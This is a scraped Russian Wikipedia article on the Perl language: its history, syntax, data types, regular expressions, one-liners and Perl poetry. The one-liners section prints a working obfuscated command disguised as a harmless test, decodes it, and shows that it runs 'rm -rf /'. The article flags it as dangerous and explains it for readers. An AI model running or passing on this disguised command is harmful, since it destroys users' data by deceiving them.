Perl — Википедия
Perl
Материал из Википедии — свободной энциклопедии
Текущая версия страницы пока
не проверялась
опытными участниками и может значительно отличаться от
версии
, проверенной 10 октября 2017; 
проверки требуют
17 правок
.
Текущая версия страницы пока
не проверялась
опытными участниками и может значительно отличаться от
версии
, проверенной 10 октября 2017; 
проверки требуют
17 правок
.
Перейти к навигации
Перейти к поиску
Perl
Семантика
мультипарадигмальный
:
императивный
,
объектно-ориентированный
,
функциональный
Класс языка
язык программирования
&#91;1&#93;
Тип исполнения
интерпретатор
Появился в
1987
Автор
Ларри Уолл
Разработчик
Ларри Уолл
&#91;1&#93;
&#32;и&#32;
The Perl Foundation
[d]
&#91;2&#93;
Расширение
файлов
.pl, .pm, .cgi
Выпуск
5.28.0 /
2018-06-23
; 235 дней тому назад
&#91;3&#93;
Система типов
слабая
динамическая
Испытал влияние
Си
,
AWK
,
Shell
,
Sed
,
Лисп
Повлиял на
Ruby
,
PHP
,
Groovy
Лицензия
Artistic License
или
GNU GPL
ОС
Linux
&#91;4&#93;
,&#32;
macOS
&#91;4&#93;
,&#32;
Microsoft Windows
&#91;4&#93;
,&#32;
Solaris
&#91;4&#93;
,&#32;
AIX
&#91;4&#93;
&#32;и&#32;
HP-UX
&#91;4&#93;
Сайт
perl.org
Perl
&#160;—
высокоуровневый
интерпретируемый
динамический
язык программирования
общего назначения, созданный
Ларри Уоллом
,
лингвистом
по образованию. Название языка официально расшифровывается как
Practical Extraction and Report Language
(«практический язык для извлечения данных и составления отчётов»)
&#91;5&#93;
, а в шутку — как
Pathologically Eclectic Rubbish Lister
(«патологически эклектичный перечислитель мусора»)
&#91;5&#93;
; разработчики языка не считают его название
акронимом
&#91;6&#93;
. Первоначально название состояло из пяти символов и в таком виде в точности совпадало с английским словом
pearl
(«жемчужина»). Но затем стало известно, что такой язык существует (см.
PEARL
(
англ.
)
), и букву «a» убрали. Символом языка Perl является
верблюд
&#160;— не слишком красивое, но очень выносливое животное, способное выполнять тяжёлую работу.
Основной особенностью языка считаются его богатые возможности для работы с текстом, в том числе работа с
регулярными выражениями
, встроенная в синтаксис. Перл унаследовал много свойств от языков
Си
,
AWK
, скриптовых языков
командных оболочек UNIX
.
Perl также знаменит огромной коллекцией
дополнительных модулей
CPAN
, находящейся по адресу
http://www.cpan.org
.
Содержание
1
Обзор
1.1
Особенности
2
История
2.1
Первые версии
2.2
Ранний Perl 5
2.3
C 2000 по наше время
2.4
Perl 6
3
Синтаксис языка Perl
3.1
Пример программы
3.2
Типы данных
3.2.1
Скаляр
3.2.2
Массив
3.2.3
Хеш-таблица
3.2.4
Функция
3.2.5
Константа
3.2.6
Запись таблицы символов
3.3
Классы и объекты
3.4
Регулярные выражения
4
Программы из одной строки
5
Языки программирования и оболочки со схожими технологиями
6
Поэзия в Perl
7
Редакторы
8
См. также
9
Примечания
10
Литература
11
Ссылки
Обзор
[
править
|
править код
]
Perl&#160;— язык программирования общего назначения, который был первоначально создан для манипуляций с текстом, но на данный момент используется для выполнения широкого спектра задач, включая
системное администрирование
,
веб-разработку
,
сетевое программирование
, игры,
биоинформатику
, разработку
графических пользовательских интерфейсов
.
Язык можно охарактеризовать скорее как практичный (лёгкость в использовании, эффективность, полнота), чем красивый (элегантность, минималистичность)
&#91;7&#93;
. Главными достоинствами языка являются поддержка различных
парадигм
(
процедурный
,
объектно-ориентированный
и
функциональный
стили программирования), контроль за памятью (без сборщика мусора, основанного на циклах), встроенная поддержка обработки текста, а также большая коллекция
модулей
сторонних разработчиков.
Согласно
Ларри Уоллу
, у Perl есть два девиза. Первый&#160;— «Есть больше одного способа это сделать» («
There’s more than one way to do it
»), известный также под аббревиатурой
TMTOWTDI
. Второй слоган&#160;— «Простые вещи должны быть простыми, а сложные вещи должны быть возможными» («
Easy things should be easy and hard things should be possible
»).
Особенности
[
править
|
править код
]
Общая структура Perl в общих чертах ведёт своё начало от языка
Си
. Perl&#160;—
процедурный
по своей природе, имеет
переменные
, выражения
присваивания
, блоки кода, отделяемые
фигурными скобками
, управляющие структуры и
функции
.
Perl также заимствует ряд свойств из языков программирования
командных оболочек UNIX
. Все переменные маркируются ведущими знаками, которые точно выражают тип данных переменной в этом контексте (например, скаляр, массив, хеш). Важно, что эти знаки позволяют переменным быть интерполированным в строках. Perl обладает множеством встроенных функций, которые обеспечивают инструментарий, часто используемый для программирования оболочки, например сортировку или вызов системных служб.
Perl заимствует
массивы
из
Лиспа
,
регулярные выражения
из
AWK
и
sed
, из AWK также позаимствованы
хеши
(«ассоциативные массивы»). Регулярные выражения облегчают выполнение многих задач по парсингу, обработке текста и манипуляций с данными.
Perl 5 добавил поддержку сложных типов данных,
первоклассных функций
(
замыкание
как значение) и объектную модель. В последнюю входят
ссылки
, пакеты, выполнение методов от класса, переменные с лексическим объявлением
области видимости
, а также
директивы
компилятора (например,
strict
). Главнейшим усовершенствованием, представленным в Perl 5, стала возможность помещать код в «пакеты» (
package
) в качестве модулей для повторного использования. Ларри Уолл позже заметил, что «Весь замысел модульной системы Perl 5 сводился к поощрению роста культуры Perl, а не строчек кода»
&#91;8&#93;
.
Все версии Perl выполняют автоматическую типизацию данных и автоматический контроль над памятью. Интерпретатор знает тип и запросы памяти каждого объекта программы, он распределяет и освобождает память, производя
подсчёт ссылок
. Перевод одного типа данных в другой&#160;— например, числа в строку&#160;— происходит автоматически во время исполнения, невозможные для выполнения переводы типов данных приводят к фатальной ошибке.
Работа в Windows
Пользователи
Microsoft Windows
обычно используют дистрибутивы с уже скомпилированными бинарными файлами, такие, как
ActivePerl
или
Strawberry Perl
[en]
, так как компиляция Perl из исходных кодов в этой
ОС
&#160;— не самая простая задача. Задачу может облегчить
Cygwin
.
История
[
править
|
править код
]
Первые версии
[
править
|
править код
]
Ларри Уолл
начал разработку Perl в
1987 году
, когда работал программистом в
Unisys
&#91;9&#93;
. Версия 1.0 была выпущена и анонсирована в
новостной группе
comp.sources.misc 18 декабря 1987 года
&#91;10&#93;
как «„замена“ для
awk
и
sed
».
Perl 2 был выпущен в
1988 году
. Основным нововведением в нём был переработанный механизм
регулярных выражений
. Perl 3, выпущенный в 1989 году, получил возможность обрабатывать потоки
двоичных данных
.
Изначально единственной документацией для Perl была единственная (огромной длины)
man
-страница. В 1991 году была выпущена книга «
Programming Perl
» (известная многим программистам как «Верблюжья книга» (
Camel Book
) из-за изображения на обложке), которая,
де-факто
, стала стандартом языка. В то же самое время версия языка была «поднята» до&#160;4&#x2011;й&#160;— не столько чтобы указать на значительные изменения, сколько чтобы обозначить, что эта версия языка документирована книгой.
Ранний Perl 5
[
править
|
править код
]
Perl 4 прошёл через серию релизов, остановившись на Perl 4.036 в
1993 году
. В этот момент Ларри Уолл забросил Perl 4 и начал работу над Perl 5. Разработка Perl 5 была начата в 1994 году. В то же время был создан
список рассылки
perl5-porters
для координации работы над
портированием
Perl 5 на различные платформы. Он до сих пор остаётся основным форумом по разработке, обслуживанию и портированию Perl 5
&#91;11&#93;
.
Perl 5.000 был выпущен 17 октября
1994 года
.
&#91;12&#93;
Он включал в себя полностью переписанный
интерпретатор
, а также много новых языковых возможностей, таких, как
объекты
,
ссылки
,
локальные переменные
(
my $var_name
) и
модули
. Особенно важной частью были модули, так как они предоставили механизм расширения языка без модифицирования интерпретатора. Это позволило стабилизировать интерпретатор, но при этом, дало возможность обычным Perl-программистам добавлять в язык новые возможности. Perl 5 находится в активной разработке по сей день.
Perl 5.001 был выпущен 13 марта 1995 года. Perl 5.002 увидел свет 29 февраля 1996 года с новой поддержкой прототипов. Это позволило авторам модулей создавать функции, которые вели себя так же, как и встроенные функции Perl. Версия Perl 5.003 появилась 25 июня 1996 года и устранила обнаружившиеся проблемы с безопасностью.
Одно из важнейших событий в истории Perl&#160;5 случилось за пределами собственно языка и было следствием поддержки модулей. 26 октября 1995 года начала свою работу
CPAN
(
Comprehensive Perl Archive Network
&#160;— «всеобъемлющая сеть архивов Perl»), которая стала
репозиторием
модулей Perl
, а также исходного кода самого языка. На данный момент сеть насчитывает более
25&#160;000
модулей, созданных более чем
8000
программистами
&#91;13&#93;
.
Perl 5.004 был выпущен 15 мая
1997 года
и содержал, кроме всего прочего, пакет UNIVERSAL, который давал языку основной объект, от которого автоматически происходили все классы. Была также включена возможность запрашивать версию модулей. В дополнение к этому Perl стал поддерживать Microsoft Windows, а также ряд других операционных систем.
Perl 5.005 увидел свет 22 июня
1998 года
. Этот релиз включал в себя несколько улучшений процессора регулярных выражений, новые перехваты в бэкенд с помощью модулей
B::*
, оператор кавычек
qr//
для регулярных выражений, большой выбор других новых модулей, а также поддержку ряда операционных систем, в частности,
BeOS
.
C 2000 по наше время
[
править
|
править код
]
Perl 5.6 был выпущен 22 марта
2000 года
. Главные изменения включали поддержку 64-битных систем, представление строк в стандарте
Юникод
, поддержку больших файлов (файлы больше
2&#160;Гб
) и ключевое слово
our
&#91;14&#93;
&#91;15&#93;
. Во время разработки Perl 5.6 было принято решение изменить схему наименования версий на более близкую к другим проектам с открытым исходным кодом. За версией 5.005_63 следовала версия 5.5.640; согласно плану, версиям в разработке должны были присваиваться нечётные номера, стабильным версиям&#160;— чётные.
В 2000 году Ларри Уолл выступил с призывом к сообществу активно обсуждать предложения к следующей версии Perl. Результатом этого обсуждения стал
361&#160;документ
RFC
(
Request for Comments
&#160;— «запрос комментариев»), которые были использованы в разработке
Perl&#160;6
. В 2001 году
&#91;16&#93;
была начата работа над окончательным документом, подводящим итог предложениям к созданию нового поколения Perl. Результат был представлен не в виде формального документа, а в качестве сводки всех RFC. К этому времени Perl&#160;6 существовал исключительно в виде описания языка.
Perl 5.8 был впервые выпущен 18 июля 2002 года и с этого времени получал ежегодное обновление. Последняя версия Perl 5.8, под номером 5.8.9, увидела свет 14 декабря 2008 года. Perl 5.8 улучшил поддержку Юникода, добавил новую реализацию ввода-вывода, добавил поддержку многопоточности, увеличил числовую точность и добавил несколько новых модулей
&#91;17&#93;
.
В 2004 году началась работа над Синопсисом (Synopsis)&#160;— первоначально задуманном как ряд документов, подводящих итоги окончательного документа, упоминавшегося выше. Однако постепенно этот ряд документов и стал спецификацией Perl&#160;6. В феврале 2005 года
Отриус Тан
начала работу над
Pugs
[en]
&#160;— интерпретатором
Perl&#160;6
, написанном на
Haskell
&#91;18&#93;
. Это было первой настоящей попыткой воплотить Perl&#160;6 в реальность. Эта попытка заглохла в 2006 году.
18 декабря 2007 года, в день 20-летней годовщины Perl 1.0, была выпущена версия Perl 5.10.0. Эта версия содержала в себе ряд заметных нововведений, приближающих её к
Perl&#160;6
. Одними из таких нововведений стали новые операторы
switch
(названных «given»/«when»), обновление регулярных выражений, а также «умный» оператор совпадения «~~»
&#91;19&#93;
&#91;20&#93;
.
Примерно в это же время всерьёз началась разработка новой реализации Perl&#160;6, известной как
Rakudo Perl
[en]
, разработанной в связке с виртуальной машиной
Parrot
. С ноября 2009 года Rakudo Perl регулярно обновляется каждый месяц и является на данный момент самой полной реализацией
Perl&#160;6
.
Значительное изменение процесса разработки Perl&#160;5 произошло после появления Perl&#160;5.11. Сообщество разработчиков перешло на ежемесячный цикл выпусков, с планированием даты выпуска на три месяца вперёд.
12 апреля 2010 года Perl 5.12.0 был представлен общественности. Выдающиеся нововведения включают в себя поддержку нового синтаксиса
package NAME VERSION
, оператор Yada Yada (служащего для маркировки кода-заполнителя, который ещё не реализован), полное решение
«проблемы 2038 года»
(Y2038), перегрузку операторов регулярных выражений, поддержку
DTrace
(фреймворка динамической трассировки), а также полную поддержку стандарта Unicode 5.2
&#91;21&#93;
. 7 сентября 2010 года был выпущен Perl 5.12.2, а
21 января
2011
&#160;— Perl 5.12.3. Эти выпуски содержат обновление модулей, а также некоторые изменения в документации
&#91;22&#93;
&#91;23&#93;
. Версия 5.12.4 выпущена
20 июня
2011. Последняя версия этой ветви, 5.12.5, выпущена
10 ноября
2012.
14 мая
2011
выпущен Perl 5.14. Поддержка
JSON
стала встроенной, начиная с версии 5.14.2. Последняя версия этой ветви, 5.14.4, выпущена
10 марта
2013.
20 мая
2012
выпущен Perl 5.16. Значимым новшеством является возможность указать нужную версию Perl, которую надо эмулировать, позволяя пользователям обновить Perl, но сохранить работоспособность старых скриптов, которые иначе стали бы несовместимыми с новой версией
&#91;24&#93;
. Ядро Perl 5.16 поддерживает
Unicode
6.1
&#91;24&#93;
.
18 мая
2013
выпущен Perl 5.18. Значимые нововведения включают новые зацепки dtrace, лексические функции, увеличение числа включенных в ядро функций, пересмотр реализации хешей из соображений безопасности, поддержка Unicode 6.2
&#91;25&#93;
.
Версия 5.20 вышла
27 мая
2014
&#91;26&#93;
. 16 апреля 2015 было объявлено о предполагавшемся выходе версии 5.22
&#91;27&#93;
, 9 мая 2016 вышла версия 5.24
&#91;28&#93;
.
30 мая
2017
года вышла очередная стабильная версия за номером 26
&#91;29&#93;
.
Информация в этой статье или некоторых её разделах устарела.
Вы можете помочь проекту,
обновив её
и убрав после этого данный шаблон.
Сопутствующие решения
Некоторые наблюдатели приписывают выходу Perl 5.10 запуск движения
Modern Perl
&#91;30&#93;
&#91;31&#93;
. В частности, эта фраза описывает стиль разработки, подразумевающий использование CPAN, использование преимуществ последних разработок на языке, а также требовательность к высокому качеству кода
&#91;32&#93;
.
В конце 2012 и в 2013 запущены несколько проектов по альтернативной реализации Perl 5: Perl5 in
Perl6
(Rakudo Perl team)
&#91;33&#93;
,
moe
(Стивен Литл с друзьями)
&#91;34&#93;
,
p2
&#91;35&#93;
(Perl11 team under Reini Urban), а также
gperl
(goccy)
&#91;36&#93;
.
Perl 6
[
править
|
править код
]
Основная статья:
Perl 6
С 2000 года идёт разработка новой (6-й) версии языка. В отличие от предыдущих версий, разработчики планируют создать чётко определённый стандарт языка. В настоящее время существуют экспериментальные компиляторы
Perl&#160;6
, но продолжается дальнейшее обсуждение новых правил.
Синтаксис языка Perl
[
править
|
править код
]
Синтаксис Perl имеет много общего с синтаксисом языков
Си
,
AWK
,
sed
и
Bourne shell
.
Первая строка исходного кода может начинаться с «#!/Путь/к/Perl [-ключи]»&#160;— что указывает системе путь к интерпретатору Perl для выполнения программы в UNIX-системах и выполнения их на
веб-сервере
(см. также:
Шебанг (Unix)
).
Пример программы
[
править
|
править код
]
Простейшая программа «
Hello, world!
» выглядит следующим образом:
#!/usr/bin/perl
print
&quot;Hello, world!\n&quot;
;
либо для
CGI
:
#!/usr/bin/perl
print
&quot;Content-type: text/html\n\n&quot;
;
print
&quot;Hello, world!&quot;
;
либо используя один из post modern web-framework
use
Mojolicious::Lite
;
get
&#39;/&#39;
=&gt;
{
text
=&gt;
&#39;Hello World!&#39;
};
app
-&gt;
start
;
либо используя
PSGI
спецификацию
my
$app
=
sub
{
return
[
200
,
[
&#39;Content-Type&#39;
=&gt;
&#39;text/plain&#39;
],
[
&quot;hello, world\n&quot;
]];
}
Дозапись в строку.
$x
=
5
;
$x
.=
0
;
print
$x
;
#50
А вот так можно напечатать число
гугол
.
print
1
,
0
x
100
;
Типы данных
[
править
|
править код
]
Основные типы данных:
скаляр
,
массив
,
хеш-таблица
,
функция
,
указание на файл
,
запись таблицы символов
. Переменные разных типов отличаются знаком, который стоит перед именем переменной:
Тип
Символ
Пример
Описание
Скаляр
$
$foo
единичное значение; может быть числом,
строкой
, указанием на файл, а также
ссылкой
.
Массив
@
@foo
Упорядоченная коллекция скаляров.
Хеш-таблица
%
%foo
Коллекция из пар строка-скаляр; строки называются
ключами
, а скаляры&#160;—
значениями
. Синоним&#160;—
ассоциативный массив
.
Файловый дескриптор
&lt; &gt;
$foo или FOO
Представление открытого файла или другой цели, открытой для чтения и/или записи.
Функция
&amp;
&amp;foo
Отрезок кода, который принимает аргументы, исполняет действия и возвращает значения.
Запись таблицы символов
*
*foo
Запись таблицы символов для всех типов с именем 'foo'.
Скаляр
[
править
|
править код
]
Скалярные переменные используются для хранения одиночных значений. Они могут содержать числа, строки и
ссылки
на другие
объекты
. Перед именем скалярной переменной необходимо ставить знак доллара '$'. Тип скалярной переменной не фиксирован (в отличие от, например, языка
Си
) и определяется динамически в зависимости от контекста. Например,
$x
=
10
;
# число
$y
=
$x
+
1
;
# используем $x как число…
$z
=
$x
.
&#39;string&#39;
;
# … а теперь — как строку
$ref
=
\
$x
;
# $ref является указателем на $x
$$ref
=
10
;
# $x содержит значение 10
Строковые данные должны быть помещены в кавычки. Perl использует два вида кавычек&#160;— одиночные и двойные. Помещение строки в двойные кавычки позволяет автоматически заменить встречающиеся имена переменных на их значения. Заключение строк в одиночные кавычки предотвращает такое поведение:
## Пример интерполяции переменных в двойных кавычках
$pi
=
3.141592654
;
$var1
=
&#39;Значение Pi - $pi\n&#39;
;
print
$var1
;
# Значение Pi - $pi\n
$var2
=
&quot;Значение Pi - $pi\n&quot;
;
print
$var2
;
# Значение Pi - 3.141592654
Для включения двойных кавычек в строку, которая была помещена в двойные кавычки, следует использовать \". Для включения одинарных кавычек в строку из одинарных кавычек&#160;— \'. Для удобства работы со строками, содержащими много знаков кавычек внутри, Perl позволяет использовать альтернативные способы закавычивания. Альтернативная форма использует любую пару знаков, помещённых после буквы q (имитирует поведение одинарных кавычек) или qq (имитирует поведение двойных кавычек):
## Пример использования альтернативных кавычек
$pi
=
3.141592654
;
$link1
=
q{&lt;a href=&quot;http://ru.wikipedia.org/wiki/Pi&quot;&gt;$pi&lt;/a&gt;}
;
print
$link1
;
# &lt;a href=&quot;http://ru.wikipedia.org/wiki/Pi&quot;&gt;$pi&lt;/a&gt;
$link2
=
qq{&lt;a href=&quot;http://ru.wikipedia.org/wiki/Pi&quot;&gt;$pi&lt;/a&gt;}
;
print
$link2
;
# &lt;a href=&quot;http://ru.wikipedia.org/wiki/Pi&quot;&gt;3.141592654&lt;/a&gt;
Ещё один тип кавычек в Perl&#160;— обратные кавычки. В них помещаются программы операционной системы, вывод которых может быть передан интерпретатору Perl. Выполнение программ всегда заканчиваются символом новой строки&#160;—
\n
:
## Пример использования обратных кавычек для исполнения команд UNIX
$space
=
`du -s -k /usr/local/bin`
;
print
$space
;
# 6264	/usr/local/bin
$sysuptime
=
`uptime`
;
print
$sysuptime
;
# 2:24  up 1 day,  9:05, 1 user, load averages: 0.26 0.32 0.33
Массив
[
править
|
править код
]
Массив
является упорядоченным списком
скаляров
. Каждый элемент массива имеет порядковый индекс, с помощью которого к нему можно получить доступ. Нумерация элементов начинается с нуля, то есть первый элемент списка имеет индекс 0. Перед именем переменной-массива необходимо ставить знак '@', а для доступа к определённому элементу массива использовать знак '$', так как отдельный элемент массива является скаляром. Многомерные массивы можно смоделировать, помещая в список ссылки на другие списки.
@array
=
(
1
,
2
,
3
,
4
);
# записали в массив @array четыре элемента
print
$array
[
2
];
# напечатать третий элемент
print
@array
[
2
,
3
];
# напечатать третий и четвёртый элемент.
# Здесь используется @, так как результат операции среза массива тоже является массивом.
Хеш-таблица
[
править
|
править код
]
Хеш-таблица представляет собой
ассоциативный массив
, позволяющий ассоциировать строку (называемую «ключом») со скаляром (значение). Строка называется ключом, а скаляр в хеш-таблице значением. Перед именем переменной-списка необходимо ставить знак процента '%', а для доступа к определенному элементу массива необходимо ставить знак '$'.
Хеш-таблицу можно инициализировать массивом или списком, состоящим из неограниченного числа последовательностей (ключ, значение).
%hash
=
(
cat
=&gt;
&#39;kitten&#39;
,
# здесь =&gt; - это так называемая &quot;длинная запятая&quot;, в этом примере
dog
=&gt;
&#39;puppy&#39;
,
# по функции полностью аналогичная обыкновенной &quot;,&quot; за исключением
cow
=&gt;
&#39;calf&#39;
# того, что литералы слева неявно заключаются в кавычки
);
print
$hash
{
&#39;cat&#39;
};
#Напечатает kitten
print
join
(
&quot;-&quot;
,
keys
%hash
)
;
# Вывод всех ключей. Напечатает cat-dog-cow
print
join
(
&quot;-&quot;
,
values
%hash
)
;
# Вывод всех значений. Напечатает kitten-puppy-calf
print
join
(
&quot;-&quot;
,
%hash
)
;
# Напечатает cat-kitten-cow-calf-dog-puppy, так как в списковом контексте хеш автоматически
# разворачивается в список (ключ, значение). Так как ключи в хеше не сортируются,
# пары каждый раз будут выводиться в произвольном порядке.
Функция
[
править
|
править код
]
Функция представляет собой фрагмент исполняемого кода. Функция всегда возвращает какое-либо значение. Если возвращаемое значение явно не указано оператором return, возвращается последнее вычисленное значение. Если в функции используется return без параметров, то в зависимости от контекста вызова функции возвращается неопределённое значение undef, пустой список или вообще ничего.
sub
printTwo
{
print
2
;
}
sub
three
{
3
;
}
$s
=
\&amp;
three
;
print
&amp;
$s
;
#Напечатает 3
$s
=
\&amp;
printTwo
;
# Запишем в скаляр $s ссылку на функцию — через эту ссылку она будет вызвана в следующей строке.
print
&amp;
$s
;
#Напечатает 21. `2` в коде функции, а `1` как значение, возвращаемое функцией printTwo
print
&amp;
printTwo
#То же самое
Константа
[
править
|
править код
]
Константа представляет собой неизменяемое значение. Константа не является встроенным типом языка и эмулируется при помощи функций. Предпочтительно задавать константы с помощью стандартного модуля constant, чтобы в будущем не зависеть от возможных изменений в реализации констант. Использование:
use
constant
MY
=&gt;
2
;
print
MY
;
Запись таблицы символов
[
править
|
править код
]
Запись таблицы символов (typeglob)&#160;— специальный тип, в котором хранятся ссылки на все переменные других типов с таким названием, а также на символы, которые часто использует для хранения файловый дескриптор, представляющих собой указатель на файл, устройство или PIPE канал, открытые для записи, чтения или для записи и чтения.
Использование:
$s
=
readline
*
STDIN
;
#Читаем одну строку из дескриптора STDIN (стандартный поток ввода); скалярный контекст.
@values
=
&lt;FILE&gt;
;
#Читаем все строчки из некоторого открытого и связанного с дескриптором FILE файла; списковый контекст.
print
STDOUT
$s
;
#Печатаем в STDOUT (стандартный поток вывода)
Более информативный пример, в котором typeglob используется для передачи файлового дескриптора в функцию:
my
$file
=
&#39;file.txt&#39;
;
#имя файла, который читаем
open
FH
,
$file
;
#открываем файл
my
$text
=
_parseFile
(
*
FH
);
#передаем файловый дескриптор в функцию
print
$text
;
close
FH
;
#обязательно закрываем файловый дескриптор
sub
_parseFile
{
my
$fh
=
shift
;
#получаем файловый дескриптор
my
$text
=
join
(
&#39;&#39;
,
&lt;$fh&gt;
);
#построчно читаем из файлового дескриптора, в строку и помещаем в переменную $text
return
$text
;
}
В последних версиях Perl появилась возможность хранить файловые дескрипторы в скалярах, и в новых программах предпочтительно пользоваться именно этим способом.
Также таблицы символов используются для связи двух имён переменной с одним значением в памяти, создавая синонимы, которые могут быть использованы для доступа и модификации значения точно также как и оригинальное имя. Эта возможность является основой системы загружаемых модулей,
классов и объектов
в Perl.
Классы и объекты
[
править
|
править код
]
Объект в Perl представляет собой просто ссылку, связанную с определённым классом (пакетом). Для связи используется функция bless. Подпрограммы такого связанного пакета являются методами и получают ссылку в качестве первого аргумента.
Специальный синтаксис для конструкторов отсутствует, используется подпрограмма пакета, возвращающая ссылку, связанную с этим пакетом.
Также существуют множество расширений для системы ООП, позволяющих менять синтаксис и использовать синтаксический сахар, в числе которых стоит назвать cpan-модуль
Moose
и его облегчённую версию
Moo
&#91;37&#93;
. Moose используется многими проектами и крупными компаниями, такими как
BBC
или
Cisco
&#91;38&#93;
.
Регулярные выражения
[
править
|
править код
]
Важной частью Perl являются
регулярные выражения
. Благодаря этому Perl хорошо подходит для обработки текстов. Бо́льшая часть работы с регулярными выражениями производится при помощи операторов
=~
,
m//
и
s///
.
Оператор
m//
используется для проверки на совпадение. В простейшем случае результат выражения
$x =~ m/abc/
будет истинным тогда и только тогда, когда строка
$x
будет соответствовать регулярному выражению
abc
. Например:
Пример
Значение
$x =~ /abc/
Строка
$x
содержит (под)строку «abc». Начальная буква «m» оператора при использовании
//
может быть опущена.
$x =~ m/a(.{1,3})c/
Строка
$x
содержит букву «a», затем от одного до трёх любых символов кроме символа перевода строки «\n», и затем букву «c».
$x =~ m{^p(erl|ugs)$}i
Строка
$x
строго равна «perl» или «pugs» без учёта регистра. Так же, вместо
//
регулярное выражение окружено в
{}
.
Поиск и замена выполняются при помощи оператора
s///
. Конструкция
$x =~ s/abc/def/;
заменит первое вхождение регулярного выражения
abc
на строку
def
.
Пример
Значение
$x =~ s/abc/def/g;
Все вхождения (на что указывает флаг
/g
&#160;— global) подстроки «abc» в
$x
будут заменены на «def».
$x =~ s/a(.{1,3})c/!$1!/;
Первое вхождение в
$x
буквы «a», затем от одного до трех любых символов кроме символа перевода строки «\n», и затем буквы «c» будет заменено на эти символы между «a» и «c», окружённые «!». Например, «syntactic» станет «synt!cti!».
$x =~ s{^p(erl|ugs)}{"P" . lc $1}ieg;
Здесь показан пример использования модификатора
/e
, указывающего на то, что вместо строки замены будет написан код, результат выполнения которого надо использовать. Все вхождения «perl» или «pugs» в любом регистре будут заменены на «Perl» и «Pugs», соответственно.
С появлением динамических регулярных выражений
(??{ код Perl })
и конструкции для включения в регулярное выражение исполняемого кода Perl
(?{ код Perl })
возможности по поиску и замене стали практически безграничными. К примеру, стал возможен поиск конструкций произвольного уровня вложенности.
Регулярные выражения Perl настолько популярны, что они включены напрямую в другие языки, такие как
PHP
и
JavaScript
, а также существуют подключаемые библиотеки, реализующие использование выражений в компилируемых языках.
Программы из одной строки
[
править
|
править код
]
Интересной и часто используемой возможностью Perl являются так называемые однострочники&#160;— программы из одной строки, обычно задаваемые прямо в строке вызова интерпретатора с помощью ключа
-e
.
Эта программа напечатает
простые числа
:
perl
-
wle
&#39;(1 x $_) !~ /^(1|((11+)\3+))$/ &amp;&amp; print while ++ $_&#39;
Этот пример напечатает только уникальные строки файла file, ключ
-n
автоматически заворачивает строку обработки в цикл, который проходит по всем строкам в файлах, указанных после текста программы:
perl
-
ne
&#39;$s{$_}++ || print&#39;
file
Примечание: для запуска предыдущей команды под
Windows
замените в ней апострофы
'
на двойные кавычки
"
.
В этих примерах Perl напоминает своей краткостью и непонятностью с первого взгляда язык
J
.
Внимание!
Запуск нижеследующего кода может привести вашу систему в неработоспособное состояние.
Также одним из подобных примеров является вызвавшая большой резонанс программа
&#91;39&#93;
, на самом деле являющаяся
патчем Бармина
(замаскированной командой рекурсивного удаления всех файлов):
echo
&quot;test... test... test...&quot;
|
perl
-
e
&#39;$??s:;s:s;;$?::s;;=]=&gt;%-{&lt;-|}&lt;&amp;|`{;;y; -/:-@[-`{-};`-{/&quot; -;;s;;$_;see&#39;
echo "test... test... test..."
выполнение этой команды не влияет на работу и добавлено, скорее всего, для усыпления бдительности. То, что происходит в остальном коде&#160;— совсем не очевидно из-за преднамеренно запутанного написания. В данной строчке записано всего три последовательно выполняемых команды. Запишем команду следующим образом:
$?
?
s:
;
s:s
;;
$?
:
:
s
;;
=
]
=&gt;
%
-
{
&lt;-|
}
&lt;&amp;|
`{; ;
y; -/:-@[-`
{
-
};
`
-
{
/
&quot;
-
;
;
s
;;
$_
;
see
Первая конструкция анализирует переменную $?&#160;— код возврата предыдущей команды. Так как перед выполнением этой конструкции дочерних процессов не создавалось, $? будет содержать 0, и выполнена будет вторая «ветка»&#160;— s;;=]=&gt;%-{&lt;-|}&lt;&amp;|`{;. Эта команда, в свою очередь, заменяет строку в переменной-аккумуляторе $_ на =]=&gt;%-{&lt;-|}&lt;&amp;|`{ (первый символ после s устанавливает ограничитель параметров этого оператора, и хотя традиционно используются слэш '/' или '|', для неясности в этой конструкции используется ограничитель ';').
Вторая команда транслирует содержимое «аккумулятора» по достаточно сложным правилам. В левой части указано четыре диапазона символов, в правой&#160;— один. Если раскрыть эти диапазоны, получим следующее соответствие:
!
&quot;#$%&amp;&#39;()*+,-./:;&lt;=&gt;?@[\]^_`{|}
`abcdefghijklmnopqrstuvwxyz{/&quot;
-
В результате содержимое $_ принимает вид
system
&quot;rm -rf /&quot;
Третья же команда дважды (как инструктирует флаг
ee
) «вычисляет» содержимое аккумулятора&#160;—
вышеуказанную деструктивную команду
&#160;— и пытается заменить пустую строку в аккумуляторе на результат вычисления.
Языки программирования и оболочки со схожими технологиями
[
править
|
править код
]
Perl&#160;— далеко не единственный язык, дающий богатые возможности в обработке текста. Языки программирования
РЕФАЛ
,
Icon
и
Снобол
предоставляют возможность более полно использовать метод программирования «сопоставления с образцом», частным случаем которого и являются регулярные выражения.
Существует также полноценная
командная оболочка UNIX
, использующая в качестве основы язык Perl. Называется она
psh
и даёт возможность смешивать команды обычной оболочки и самого Perl’а
&#91;40&#93;
.
Поэзия в Perl
[
править
|
править код
]
На Perl можно даже писать стихотворения. Одно из таких стихотворений под названием «Black Perl» («Чёрная жемчужина» или «Чёрный перл») было упомянуто Ларри Уоллом в первоапрельском письме в
Usenet
. Оно было написано изначально для Perl&#160;3, и по словам самого Ларри, он испытал моральное удовлетворение, когда стихотворение не прошло синтаксический анализатор в Perl&#160;5.
BEFOREHEAD:
close
door
,
each
window
&amp;
exit
;
wait
until
time
.
open
spellbook
,
study
,
read
(
scan
,
select
,
tell
us
);
write
it
,
print
the
hex
whole
each
watches
,
reverse
its
length
,
write
again
;
kill
spiders
,
pop
them
,
chop
,
split
,
kill
them
.
unlink
arms
,
shift
,
wait
&amp;
listen
(
listening
,
wait
),
sort
the
flock
(
then
,
warn
the
&quot;goats&quot;
&amp;
kill
the
&quot;sheep&quot;
);
kill
them
,
dump
qualms
,
shift
moralities
,
values
aside
,
each
one
;
die
sheep
!
die
to
reverse
the
system
you
accept
(
reject
,
respect
);
next
step
,
kill
next
sacrifice
,
each
sacrifice
,
wait
,
redo
ritual
until
&quot;all the spirits are pleased&quot;
;
do
it
(
&quot;as they say&quot;
)
.
do
it
(
*
everyone
***
must
***
participate
***
in
***
forbidden
**
s
*
e
*
x
*
)
.
return
last
victim
;
package
body
;
exit
crypt
(
time
,
times
&amp;
&quot;half a time&quot;
)
&amp;
close
it
,
select
(
quickly
)
&amp;
warn
your
next
victim
;
AFTERWORDS:
tell
nobody
,
wait
,
wait
until
time
;
wait
until
next
year
,
